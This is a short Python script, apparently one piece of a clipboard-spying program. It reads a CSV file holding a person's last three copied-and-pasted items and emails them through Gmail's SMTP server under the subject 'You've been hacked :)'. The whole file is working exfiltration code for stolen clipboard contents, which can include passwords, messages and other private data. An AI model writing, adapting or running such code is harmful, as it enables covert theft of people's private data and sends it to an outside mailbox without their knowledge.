import smtplib
import csv
import ssl 
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

ctx = ssl.create_default_context()

def sendEmail():
    password = "" #UPDATE THIS WITH YOUR PASSWORD 
    email_sender = '' #UPDATE THIS WITH YOUR EMAIL 
    email_receiver = '' #UPDATE THIS WITH YOUR EMAIL 
    subject = 'You\'ve been hacked :)'

    msg = MIMEMultipart()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['Subject'] = subject

    body = 'These are the last 3 things you have copied and pasted: \n'
    
    
    with open('person.csv', 'r', newline='\n') as readFile:
        reader = csv.reader(readFile)
        for row in reader:
            body = body + row[0] + '\n'

    msg.attach(MIMEText(body, 'plain'))
    text = msg.as_string()

    with smtplib.SMTP_SSL("smtp.gmail.com", port=465, context=ctx) as server:
        server.login(email_sender, password)
        server.sendmail(email_sender, email_receiver, text)

    #connection = smtplib.SMTP('smtp.gmail.com', 587)
    #connection.starttls()
    #connection.login(email_sender, 'password')
    #connection.sendmail(email_sender, email_receiver, text)
    #connection.quit()
